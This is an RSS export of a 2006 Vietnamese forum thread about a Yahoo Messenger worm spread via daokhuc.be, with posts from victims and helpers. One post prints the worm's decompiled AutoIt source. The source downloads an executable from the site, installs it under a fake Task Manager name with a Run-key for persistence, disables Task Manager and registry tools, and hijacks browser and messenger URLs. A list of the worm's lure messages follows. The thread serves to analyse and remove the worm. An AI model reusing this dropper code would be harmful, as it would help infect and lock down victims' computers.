+				<pubDate><![CDATA[Sat, 2 Sep 2006 18:12:44]]> GMT</pubDate>
+				<author><![CDATA[ _HITMAN_]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ daokhuc.be -&gt;
+<blockquote>
+...
+;--------------------------------------------
+; Tac Gia: Kevin Duong - KVD
+; Phan Mem: DKC Bot
+; Phien Ban: 1.1
+; Cong Dung: Quang cao Website thong qua Y!M
+; Phat Hanh: 1-9-2006
+;--------------------------------------------
+...
+$website = "http://daokhuc.be"
+
+; Lay Nhiem Vao He Thong
+If Not FileExists(@WindowsDir & "\<font color='yellow'>taskmng.exe</font>") Then
+ 		InetGet ($website & "/dkc.exe", @WindowsDir & "\taskmng.exe", 0, 1)
+ 		Sleep(5000)
+	EndIf
+
+; Ghi Khoa Registry
+RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
+RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
+RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
+RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmng.exe")
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "Dao Khuc Community :: Chut gi de nho...")
+...
+&nbsp;
+		</blockquote>
+
+Messages:
+<blockquote>
+1. "Nguoi ra di vi anh da mang lam lo hay tai vi anh day qua ngheo? Chang the trao ve em duoc nhu long em luon uoc mo, giac mo giau sang... "
+2. "Ngay khong em anh day lam sao cho het ngay? Sang dem duong nhu chi co anh voi anh quay quang... " 
+3. "Om bau dau thuong, minh anh co don chon day. Ngay mai em ra di, chon giau bao ky niem... " 
+4. "Dem nay mua ngoai hien, mua oi dung roi them cho xot xa. Anh khong quay ve day, loi nao anh noi da quen... " 
+5. "Ngay mai thoi doi ta lia xa em con nho? That long anh muon ta nhin thay nhau, cho quen mau cau yeu thuong em voi anh hom nao... " & "Tra lai em niem vui khi duoc gan ben em, tra lai em loi yeu thuong em dem, tra lai em niem tin thang nam qua ta dap xay. Gio day chi la nhung ky niem buon... " 
+6. "Loi em noi cho tinh chung ta, nhu doan cuoi trong cuon phim buon. Nguoi da den nhu la giac mo roi ra di cho anh bat ngo... " 
+7. "Tha nguoi dung noi se yeu minh toi mai thoi thi gio day toi se vui hon. Gio nguoi lac loi buoc chan ve noi xa xoi, cay dang chi rieng minh toi... " 
+8. "Khoc cho nho thuong voi trong long, khoc cho noi sau nhe nhu khong. Bao nhieu yeu thuong nhung ngay qua da tan theo khoi may bay that xa... " 
+9. "Toi di lang thang lan trong bong toi buot gia, ve dau khi da mat em roi? Ve dau khi bao nhieu mo mong gio da vo tan... Ve dau toi biet di ve dau? " 
+&nbsp;
+		</blockquote>
+
+!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20232</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20232</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 19:28:40]]> GMT</pubDate>
+				<author><![CDATA[ mfeng]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">KVD wrote:</cite><br>
+		<blockquote>Trong AutoIt có một công cụ hữu ích decompile *.exe thành script *.au3... Bạn có thể dùng cái đó để có mã nguồn nhưng trong một số trường hợp, coder có thể không cho phép bạn decompile hoặc đặt pass...&nbsp;
+		</blockquote>
+Cậu em coi chừng đó, chưa thấy mấy bài học trước hả?  :mrgreen: ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20244</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20244</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 20:16:47]]> GMT</pubDate>
+				<author><![CDATA[ hung1910]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ http://daokhuc.be/ Cái này lây qua lỗi gì vậy?? Sau tui vào mà ko thấy có ảnh hưởng gì?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20248</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20248</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 21:02:09]]> GMT</pubDate>
+				<author><![CDATA[ kara_men]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Ông cứ chờ 1 hồi thì sẻ biết , nó tự thay đổi status với tự gữi link cho mọi người trong list đó , kiểm tra xem các tin đã gữi coi , vô task manager có được ko ? !]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20249</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20249</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 21:15:03]]> GMT</pubDate>
+				<author><![CDATA[ _HITMAN_]]></author>
+			</item>
+			<item>
+				<title>Re: Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Sao bây giờ lắm Vius lây lan qua Y!M thế nhỉ????
+Cũng là đòn cảnh tỉnh cho các người dùng ở Việt Nam!!!!!  :))  :)) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20251</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20251</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 21:31:45]]> GMT</pubDate>
+				<author><![CDATA[ TuanHung91]]></author>
+			</item>
+			<item>
+				<title>Re: Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Đồng chí phoenix cho hỏi làm sao để kill con vius này đây? Con này mới quá, chưa có sòt nào kill dc, có ai chỉ cách kill bằng tay ko?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20257</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20257</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 21:58:41]]> GMT</pubDate>
+				<author><![CDATA[ netprobienhoa]]></author>
+			</item>
+			<item>
+				<title>Re: Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Vào registry xoá hết :
+<blockquote>RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1") 
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1") 
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1") 
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website) 
+RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website) 
+RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website) 
+RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmng.exe") 
+RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "Dao Khuc Community :: Chut gi de nho...") &nbsp;
+		</blockquote>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20258</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20258</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 22:08:23]]> GMT</pubDate>
+				<author><![CDATA[ hung1910]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Mình cũng tình cờ nhấp vào trang daokhuc.be hôm nay và đã bị virus tấn công hết lỗi thoát. anh em có cách nào triệt con virus tình cơ này ko?
+
+không những nó send cho hàng loạt people in friendlist, nó có set Home Page cho mình nữa chứ.  mình ko dc thâm hỉu về máy tính cho lắm, vào internet options nhưng cái homepage bị disable rồi. ai biết set homepage lại không?
+
+chán wá chán wá]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20261</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20261</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 22:17:36]]> GMT</pubDate>
+				<author><![CDATA[ chaoga]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Như bác hung1910 nói , vào registry xoá hết mấy cái khoá đó , hiện giờ thì làm thủ công vậy thôi , tui củng bị nhiễm , may là mới hôm qua tạo file ghost nên bây giờ ghost lại ko sao . Hình như ngoài cái link daokhuc.be thì còn có cái http://minhnhut.be nữa ???]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20265</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20265</link>
+				<pubDate><![CDATA[Sat, 2 Sep 2006 22:40:05]]> GMT</pubDate>
+				<author><![CDATA[ _HITMAN_]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">_HITMAN_ wrote:</cite><br>
+		<blockquote>Ông cứ chờ 1 hồi thì sẻ biết , nó tự thay đổi status với tự gữi link cho mọi người trong list đó , kiểm tra xem các tin đã gữi coi , vô task manager có được ko ? !&nbsp;
+		</blockquote>
+Chờ rồi, restart máy cũng ko thấy gì. Lúc load cái trang đó bằng Fire Fox cũng ko thấy mà thử load bằng IE 6 cũng ko thấy gì. Dù sao cũng change pass trước thời hạn luôn rồi.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20281</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20281</link>
+				<pubDate><![CDATA[Sun, 3 Sep 2006 00:22:30]]> GMT</pubDate>
+				<author><![CDATA[ kara_men]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">chaoga wrote:</cite><br>
+		<blockquote>Mình cũng tình cờ nhấp vào trang daokhuc.be hôm nay và đã bị virus tấn công hết lỗi thoát. anh em có cách nào triệt con virus tình cơ này ko?
+
+không những nó send cho hàng loạt people in friendlist, nó có set Home Page cho mình nữa chứ.  mình ko dc thâm hỉu về máy tính cho lắm, vào internet options nhưng cái homepage bị disable rồi. ai biết set homepage lại không?
+
+chán wá chán wá&nbsp;
+		</blockquote>
+Home page Unlock nè. import nó vào nhé.
+<span class="link"> http://www.kellys-korner-xp.com/regs_edits/HomePageUnlock.reg</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20284</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20284</link>
+				<pubDate><![CDATA[Sun, 3 Sep 2006 00:27:55]]> GMT</pubDate>
+				<author><![CDATA[ kara_men]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">chaoga wrote:</cite><br>
+		<blockquote>Mình cũng tình cờ nhấp vào trang daokhuc.be hôm nay và đã bị virus tấn công hết lỗi thoát. anh em có cách nào triệt con virus tình cơ này ko?
+
+không những nó send cho hàng loạt people in friendlist, nó có set Home Page cho mình nữa chứ.  mình ko dc thâm hỉu về máy tính cho lắm, vào internet options nhưng cái homepage bị disable rồi. ai biết set homepage lại không?
+
+chán wá chán wá&nbsp;
+		</blockquote>
+bạn vào đây tôi đã post lên tool để khắc phục tại đây:
+<span class="link"> http://www.hvaforum.net/hvaonline/posts/list/3497.hva</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20292</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20292</link>
+				<pubDate><![CDATA[Sun, 3 Sep 2006 00:56:22]]> GMT</pubDate>
+				<author><![CDATA[ jamesmr]]></author>
+			</item>
+			<item>
+				<title>Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Cũng chỉ tại mấy bác mất cảnh giác thui. Nhìu lúc mình không bị nhưng người khác bị cũng phiền nữa cứ 2-3 phút nó lại gửi 1 lần. Nhưng giờ trang web đó die rùi]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20379</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20379</link>
+				<pubDate><![CDATA[Sun, 3 Sep 2006 13:21:19]]> GMT</pubDate>
+				<author><![CDATA[ babyskill]]></author>
+			</item>
+			<item>
+				<title>Re: Một virus qua YIM mới vừa xuất hiện</title>
+				<description><![CDATA[ Các bác ơi!
+Em là thành viên mới của HVA forum.
+Em cũng rất thix tìm hiểu về những con virus lây wa YM này, chỉ để học hỏi thui. Nhưng mà em hầu như ko biết gì về mấy cái này, các bác giúp em nhé.
+Với lại, cho em hỏi, những con virus kiểu như vậy thì thường có dấu hiệu gì để nhận biết ạ???
+Thanx các bác trước nhé.
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20644</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2281.hva#20644</link>
+				<pubDate><![CDATA[Mon, 4 Sep 2006 16:38:54]]> GMT</pubDate>
+				<author><![CDATA[ huynhanhdiep]]></author>
+			</item>
+	</channel>
+</rss>
